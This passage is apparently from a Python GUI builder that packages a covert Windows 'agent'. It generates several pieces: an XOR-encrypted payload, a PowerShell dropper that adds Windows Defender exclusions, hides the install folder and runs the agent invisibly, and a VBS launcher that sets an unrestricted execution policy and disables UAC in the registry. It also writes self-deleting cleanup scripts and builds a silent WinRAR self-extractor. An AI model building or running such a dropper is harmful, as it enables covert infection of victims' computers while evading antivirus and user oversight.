                hook_dll = os.path.join(main_mod_dir, "hook.dll")
                wcd_dll = os.path.join(main_mod_dir, "wcd.dll")
                
                if os.path.exists(ldr_exe):
                    os.remove(ldr_exe)
                    self._log("SYS: Removed ldr.exe")
                if os.path.exists(hook_dll):
                    os.remove(hook_dll)
                    self._log("SYS: Removed hook.dll")
                if os.path.exists(wcd_dll):
                    os.remove(wcd_dll)
                    self._log("SYS: Removed wcd.dll")
            
            self._log("SYS: 5/5 Scanning for custom modules...")
            
            excluded_files = {"htr.cpp", "ldr.cpp", "hook.cpp", "cvm.cpp", "prep.cpp"}
            custom_modules_found = False
            
            for root, dirs, files in os.walk(modules_dir):
                for file in files:
                    if file.endswith('.cpp'):
                        filename = os.path.basename(file)
                        
                        if filename in excluded_files:
                            continue
                        
                        custom_modules_found = True
                        
                        source_path = os.path.join(root, file)
                        module_name = filename.replace('.cpp', '.dll')
                        output_path = os.path.join(root, module_name)
                        
                        self._log(f"Found custom module: {filename}")
                        self._log(f"  Compiling to: {module_name}...")
                        
                        cmd = [gxx, "-shared", "-o", output_path, source_path] + flags + include_paths + libs
                        
                        process = subprocess.Popen(
                            cmd,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            cwd=root,
                            universal_newlines=True
                        )
                        stdout, stderr = process.communicate(timeout=120)
                        
                        if process.returncode != 0:
                            self._log(f"ERROR: Failed to compile {module_name}")
                            if stderr:
                                for line in stderr.split('\n')[:3]:
                                    if line.strip():
                                        self._log(f"      {line}")
                        elif os.path.exists(output_path):
                            dll_size = os.path.getsize(output_path)
                            self._log(f"SYS: {module_name} compiled ({dll_size / 1024:.1f} KB)")
                        else:
                            self._log(f"ERROR: {module_name} not created")
            
            if not custom_modules_found:
                self._log("NOTICE: No custom modules found")
            
            self._log("COMPILATION COMPLETE")
            
            os.environ["PATH"] = old_path
            
            return True
            
        except Exception as e:
            self._log(f"\nERROR: Compilation exception: {e}")
            import traceback
            self._log(traceback.format_exc())
            return False
    
    def _create_package(self):

        try:
            resource_dir = os.path.join(self.build_dir, "resource")

            self._log("SYS: Verifying compilation artifacts...")
            agent_exe = f"{self.agent_name.get()}.exe"
            agent_exe_path = os.path.join(resource_dir, agent_exe)

            if not os.path.exists(agent_exe_path):
                self._log(f"ERROR: {agent_exe} not found! Compilation may have failed.")
                return False

            self._log(f"NOTICE: Found {agent_exe}")

            main_dir = os.path.join(resource_dir, "modules", "main")
            required_dlls = ["cvm.dll", "prep.dll"]

            for dll in required_dlls:
                dll_path = os.path.join(main_dir, dll)
                if os.path.exists(dll_path):
                    self._log(f"NOTICE: Found {dll}")
                else:
                    self._log(f"WARNING: {dll} not found")

            self._log("SYS: Cleaning source files from package...")

            source_extensions = ['.cpp', '.c', '.h', '.hpp', '.o', '.obj']
            files_removed = 0

            for root, dirs, files in os.walk(resource_dir):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in source_extensions):
                        file_path = os.path.join(root, file)
                        try:
                            os.remove(file_path)
                            files_removed += 1
                            self._log(f"  Removed: {os.path.relpath(file_path, resource_dir)}")
                        except Exception as e:
                            self._log(f"ERROR: Failed to remove {file}: {e}")

            self._log(f"SYS: Removed {files_removed} source file(s)")

            self._log("SYS: Final verification - checking for remaining source files...")
            remaining_sources = []
            for root, dirs, files in os.walk(resource_dir):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in source_extensions):
                        remaining_sources.append(os.path.relpath(os.path.join(root, file), resource_dir))

            if remaining_sources:
                self._log(f"WARNING: {len(remaining_sources)} source file(s) still present:")
                for src in remaining_sources[:10]:
                    self._log(f"  • {src}")
            else:
                self._log("SYS: All source files removed successfully")

            if not self.include_main_tools.get():
                self._log("SYS: Include Default Tools disabled - removing main tool modules...")

                modules_dir = os.path.join(resource_dir, "modules")
                for dll in ["monitor.dll", "fmgr.dll", "opencv_world4120.dll"]:
                    dll_path = os.path.join(modules_dir, dll)
                    if os.path.exists(dll_path):
                        os.remove(dll_path)
                        self._log(f"  REMOVED: {dll}")
                    else:
                        self._log(f"  NOT FOUND: {dll} (already absent)")
                self._log("SYS: Main tool modules cleanup complete")
            else:
                self._log("SYS: Include Default Tools enabled - keeping main tool modules")

            self._log("SYS: Final package contents (executables and data only):")
            for root, dirs, files in os.walk(resource_dir):
                for file in files:
                    rel_path = os.path.relpath(os.path.join(root, file), resource_dir)
                    file_size = os.path.getsize(os.path.join(root, file))
                    self._log(f"  → {rel_path} ({file_size / 1024:.1f} KB)")

            agent_dir = os.path.join(self.build_dir, "agent")
            if os.path.exists(agent_dir):
                shutil.rmtree(agent_dir)
            shutil.move(resource_dir, agent_dir)

            zip_path = os.path.join(self.build_dir, "agent.zip")
            self._log("SYS: Creating agent.zip...")

            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(agent_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, self.build_dir)
                        zipf.write(file_path, arcname)

            zip_size = os.path.getsize(zip_path)
            self._log(f"SYS: agent.zip created ({zip_size / 1024:.1f} KB)")

            bin_path = os.path.join(self.build_dir, "agent.bin")
            xor_en(zip_path, bin_path, self.xor_password.get())
            bin_size = os.path.getsize(bin_path)
            self._log(f"SYS: agent.bin encrypted ({bin_size / 1024:.1f} KB)")

            if os.path.exists(zip_path):
                os.remove(zip_path)
                self._log("SYS: Removed intermediate agent.zip")

            self._log("SYS: Creating launcher scripts...")
            self._create_decrypt_ps1()
            self._create_vbs_launcher()
            self._create_watcher_vbs() 

            required_files = {
                'agent.bin':   bin_path,
                'tao.ps1':     os.path.join(self.build_dir, "tao.ps1"),
                'run.vbs':     os.path.join(self.build_dir, "run.vbs"),
                'watcher.vbs': os.path.join(self.build_dir, "watcher.vbs"),
            }

            self._log("SYS: Verifying launcher files...")
            for file_name, file_path in required_files.items():
                if not os.path.exists(file_path):
                    self._log(f"ERROR: {file_name} not created at {file_path}")
                    return False
                else:
                    file_size = os.path.getsize(file_path)
                    self._log(f"SYS: {file_name} verified ({file_size:,} bytes)")

            self._log("SYS: All package files verified")
            return True

        except Exception as e:
            self._log(f"Package creation error: {e}")
            import traceback
            self._log(traceback.format_exc())
            return False

    def _create_decrypt_ps1(self):

        agent_exe = f"{self.agent_name.get()}.exe"
        xor_key = self.xor_password.get()

        csharp_code = """using System;
public class FastXOR {
    public static void Cipher(byte[] data, byte[] key) {
        int kLen = key.Length;
        for (int i = 0; i < data.Length; i++) {
            data[i] ^= key[i % kLen];
        }
    }
}"""

        decrypt_content = rf"""
$ErrorActionPreference = 'SilentlyContinue'

$BIN_FILE = "agent.bin"
$OUTPUT_ZIP = "agent.zip"
$XOR_KEY = "{xor_key}"
$TARGET_EXE = "{agent_exe}"

$CurDir = $null
if ($PSScriptRoot) {{
    $CurDir = $PSScriptRoot
}} elseif ($MyInvocation.MyCommand.Path) {{
    $CurDir = Split-Path -Parent $MyInvocation.MyCommand.Path
}} else {{
    $CurDir = $env:TEMP
    $foundBin = Get-ChildItem -Path $env:TEMP -Filter $BIN_FILE -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($foundBin) {{
        $CurDir = $foundBin.DirectoryName
    }}
}}

Start-Sleep -Milliseconds 1000

try {{
    Add-MpPreference -ExclusionPath $CurDir -ErrorAction SilentlyContinue
}} catch {{}}

$TARGET_DIR = $null
$candidateDirs = @(
    "$env:APPDATA\Microsoft\Windows",
    "C:\Users\Public\Documents",
    "C:\Users\Public\Music",
    "C:\ProgramData",
    "C:\Intel"
)

foreach ($dir in $candidateDirs) {{
    if ((Test-Path $dir) -and (-not $TARGET_DIR)) {{
        try {{
            $randName = "System$(Get-Random -Minimum 1000 -Maximum 9999)"
            $TARGET_DIR = Join-Path $dir $randName
            break
        }} catch {{
            continue
        }}
    }}
}}

if (-not $TARGET_DIR) {{
    $randName = "System$(Get-Random -Minimum 1000 -Maximum 9999)"
    $TARGET_DIR = Join-Path $env:TEMP $randName
}}

try {{
    New-Item -Path $TARGET_DIR -ItemType Directory -Force | Out-Null
    Start-Sleep -Milliseconds 300
    $folder = Get-Item $TARGET_DIR -Force -ErrorAction SilentlyContinue
    if ($folder) {{
        $folder.Attributes = 'Hidden,System'
    }}
    Add-MpPreference -ExclusionPath $TARGET_DIR -ErrorAction SilentlyContinue
}} catch {{
    $TARGET_DIR = Join-Path $env:TEMP "System$(Get-Random -Minimum 1000 -Maximum 9999)"
    New-Item -Path $TARGET_DIR -ItemType Directory -Force | Out-Null
}}

$binPath = $null
$searchPaths = @(
    (Join-Path $CurDir $BIN_FILE),
    (Join-Path $env:TEMP $BIN_FILE)
)

foreach ($path in $searchPaths) {{
    if (Test-Path $path) {{
        $binPath = $path
        break
    }}
}}

if (-not $binPath) {{
    $maxRetries = 10
    $retryCount = 0
    while ((-not $binPath) -and ($retryCount -lt $maxRetries)) {{
        Start-Sleep -Milliseconds 500
        $foundBin = Get-ChildItem -Path $env:TEMP -Filter $BIN_FILE -Recurse -Depth 2 -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($foundBin) {{
            $binPath = $foundBin.FullName
            $CurDir = $foundBin.DirectoryName
            break
        }}
        $retryCount++
    }}
}}

if (-not $binPath -or -not (Test-Path $binPath)) {{
    $errorLog = Join-Path $env:TEMP "agent_error.log"
    $debugInfo = "ERROR: agent.bin not found`n"
    $debugInfo += "Attempted CurDir: $CurDir`n"
    $debugInfo += "PSScriptRoot: $PSScriptRoot`n"
    $debugInfo += "MyInvocation.MyCommand.Path: $($MyInvocation.MyCommand.Path)`n"
    $debugInfo += "TEMP: $env:TEMP`n"
    $debugInfo += "Searched paths: $($searchPaths -join ', ')`n`n"
    $debugInfo += "Files in TEMP:`n"
    $debugInfo += (Get-ChildItem $env:TEMP -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name | Out-String)
    $debugInfo | Out-File $errorLog -Encoding UTF8
    exit 1
}}

$targetBinPath = Join-Path $TARGET_DIR $BIN_FILE
try {{
    $binData = [System.IO.File]::ReadAllBytes($binPath)
    [System.IO.File]::WriteAllBytes($targetBinPath, $binData)
    Start-Sleep -Milliseconds 300
    if (Test-Path $targetBinPath) {{
        Remove-Item -Path $binPath -Force -ErrorAction SilentlyContinue
    }}
}} catch {{
    $errorLog = Join-Path $env:TEMP "agent_error.log"
    "Copy error: $_" | Out-File $errorLog -Append
    exit 1
}}

Set-Location $TARGET_DIR

$csharpCode = @'
{csharp_code}
'@

try {{
    if (-not ([System.Management.Automation.PSTypeName]'FastXOR').Type) {{
        Add-Type -TypeDefinition $csharpCode -ErrorAction Stop
    }}

    if (-not (Test-Path $targetBinPath)) {{
        throw "Target bin file not found at $targetBinPath"
    }}

    $data = [System.IO.File]::ReadAllBytes($targetBinPath)
    $key = [System.Text.Encoding]::UTF8.GetBytes($XOR_KEY)

    [FastXOR]::Cipher($data, $key)

    $targetZipPath = Join-Path $TARGET_DIR $OUTPUT_ZIP
    [System.IO.File]::WriteAllBytes($targetZipPath, $data)

    if (-not (Test-Path $targetZipPath)) {{
        throw "Failed to create decrypted ZIP"
    }}

    Expand-Archive -Path $targetZipPath -DestinationPath $TARGET_DIR -Force

    Start-Sleep -Milliseconds 500

    Remove-Item -Path $targetZipPath -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $targetBinPath -Force -ErrorAction SilentlyContinue

    $agentPath = Get-ChildItem -Path $TARGET_DIR -Filter $TARGET_EXE -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1

    if ($agentPath) {{
        try {{
            Add-MpPreference -ExclusionProcess $TARGET_EXE -ErrorAction SilentlyContinue
        }} catch {{}}

        $startInfo = New-Object System.Diagnostics.ProcessStartInfo
        $startInfo.FileName = $agentPath.FullName
        $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $startInfo.CreateNoWindow = $true
        $startInfo.UseShellExecute = $false
        $startInfo.WorkingDirectory = Split-Path $agentPath.FullName

        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $startInfo
        $process.Start() | Out-Null

        Start-Sleep -Milliseconds 1000

        # Clean up tao.ps1 and run.vbs.
        # watcher.vbs is responsible for deleting the SFX — do NOT touch it here.
        $psScriptPath = $MyInvocation.MyCommand.Path
        if ($psScriptPath -and (Test-Path $psScriptPath)) {{
            Remove-Item -Path $psScriptPath -Force -ErrorAction SilentlyContinue
        }}

        $vbsPath = Join-Path $CurDir "run.vbs"
        if (Test-Path $vbsPath) {{
            Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
        }}

        exit 0
    }} else {{
        throw "Agent executable not found after extraction"
    }}
}} catch {{
    $errorLog = Join-Path $env:TEMP "agent_error.log"
    $errorInfo = "Decryption/Launch Error: $_`n"
    $errorInfo += "Stack Trace: $($_.ScriptStackTrace)`n"
    $errorInfo += "Target Directory: $TARGET_DIR`n"
    $errorInfo += "Agent EXE: $TARGET_EXE`n"
    $errorInfo += "Bin Path: $targetBinPath`n"
    $errorInfo += "Bin Exists: $(Test-Path $targetBinPath)`n`n"
    $errorInfo += "Directory Contents:`n"
    $errorInfo += (Get-ChildItem $TARGET_DIR -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, Length | Format-Table | Out-String)
    $errorInfo | Out-File $errorLog -Append -Encoding UTF8
    exit 1
}}

exit 1
"""

        decrypt_path = os.path.join(self.build_dir, "tao.ps1")
        with open(decrypt_path, 'w', encoding='utf-8') as f:
            f.write(decrypt_content)

        self._log(f"SYS: powershell file created at {decrypt_path}")

    def _create_vbs_launcher(self):
        vbs_content = '''Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strDir = objFSO.GetParentFolderName(WScript.ScriptFullName)
strPS1 = strDir & "\\tao.ps1"
WScript.Sleep 500
Dim retryCount
retryCount = 0
While Not objFSO.FileExists(strPS1) And retryCount < 6
    WScript.Sleep 500
    retryCount = retryCount + 1
Wend

If objFSO.FileExists(strPS1) Then
    strSetPolicy = "powershell.exe -NoProfile -WindowStyle Hidden -Command ""Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force"""
    objShell.Run strSetPolicy, 0, True

    WScript.Sleep 1000

    On Error Resume Next
    strDisableUAC = "reg add ""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"" /v EnableLUA /t REG_DWORD /d 0 /f"
    objShell.Run strDisableUAC, 0, True
    On Error GoTo 0

    WScript.Sleep 500

    strRunScript = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & strPS1 & """"
    objShell.Run strRunScript, 0, False

    WScript.Sleep 3000
Else
    Dim logPath
    logPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\\agent_error.log"
    Dim objFile
    Set objFile = objFSO.OpenTextFile(logPath, 8, True)
    objFile.WriteLine "VBS Error: tao.ps1 not found at " & strPS1
    objFile.WriteLine "Directory contents: " & strDir
    objFile.Close
End If

strSelf = WScript.ScriptFullName
objShell.Run "cmd.exe /c timeout /t 2 > nul & del /f /q """ & strSelf & """", 0, False
'''

        vbs_path = os.path.join(self.build_dir, "run.vbs")
        with open(vbs_path, 'w', encoding='utf-8') as f:
            f.write(vbs_content)

        self._log(f"SYS: run.vbs created at {vbs_path}")

    def _create_watcher_vbs(self):
        sfx_name = f"{self.agent_name.get()}.exe"

        watcher_content = f'''Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

strDir = objFSO.GetParentFolderName(WScript.ScriptFullName)
strSFX = strDir & "\\{sfx_name}"
strBin = strDir & "\\agent.bin"

Dim maxWait
maxWait = 120
Dim waited
waited = 0

Do While objFSO.FileExists(strBin) And waited < maxWait
    WScript.Sleep 1000
    waited = waited + 1
Loop

WScript.Sleep 3000

If objFSO.FileExists(strSFX) Then
    On Error Resume Next
    objFSO.DeleteFile strSFX, True
    On Error GoTo 0
End If

Dim strSelf
strSelf = WScript.ScriptFullName
objShell.Run "cmd.exe /c timeout /t 2 >nul & del /f /q """ & strSelf & """", 0, False
'''

        watcher_path = os.path.join(self.build_dir, "watcher.vbs")
        with open(watcher_path, 'w', encoding='utf-8') as f:
            f.write(watcher_content)

        self._log(f"SYS: watcher.vbs created at {watcher_path}")

    def _create_sfx(self):
        try:
            if getattr(sys, 'frozen', False):
                base_dir = os.path.dirname(sys.executable)
            else:
                base_dir = os.path.dirname(os.path.abspath(__file__))

            winrar_path = os.path.join(base_dir, "compilers", "WinRAR", "WinRAR.exe")

            if not os.path.exists(winrar_path):
                self._log(f"ERROR: WinRAR.exe not found at: {winrar_path}")
                return False

            output_name = f"{self.agent_name.get()}.exe"
            output_path = os.path.join(self.output_dir, output_name)
            comment_path = os.path.join(self.build_dir, "sfx_config.txt")

            sfx_script = [
                "Path=%TEMP%",
                "Setup=wscript.exe //B //Nologo watcher.vbs",
                "Setup=wscript.exe //B //Nologo run.vbs",
                "Silent=2",
                "Overwrite=1",
                "Update=U",
                "Delete=1"
            ]

            with open(comment_path, "w", encoding="utf-8") as f:
                f.write("\n".join(sfx_script))

            cmd = [
                winrar_path, "a", "-sfx", "-ep1", "-o+", "-y",
                f"-z{comment_path}",
                output_path,
                os.path.join(self.build_dir, "*")
            ]

            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE

            process = subprocess.run(cmd, capture_output=True, startupinfo=startupinfo)

            if process.returncode in [0, 1]:
                self._log(f"SYS: WinRAR SFX created: {output_name}")
                if os.path.exists(comment_path):
                    os.remove(comment_path)
                return True
            else:
                self._log(f"ERROR: WinRAR failed: {process.stderr.decode(errors='ignore')}")
                return False

        except Exception as e:
            self._log(f"ERROR: {e}")
            return False

    def _cleanup(self):
        try:
            rem_exc(self.build_dir)
            self._log("SYS: Defender exclusion removed")

            if os.path.exists(self.build_dir):
                shutil.rmtree(self.build_dir, ignore_errors=True)
                self._log("SYS: Build directory cleaned")

        except Exception as e:
            self._log(f"Cleanup warning: {e}")


def main():
    root = tk.Tk()
    app = BuilderGUI(root)
    
    if os.path.exists(ICON_PATH):
        try:
            root.iconbitmap(ICON_PATH)
        except Exception as e:
            print(f"Error loading icon: {e}")
    else:
        print(f"Icon not found at: {ICON_PATH}")
        
    root.mainloop()

if __name__ == "__main__":
    main()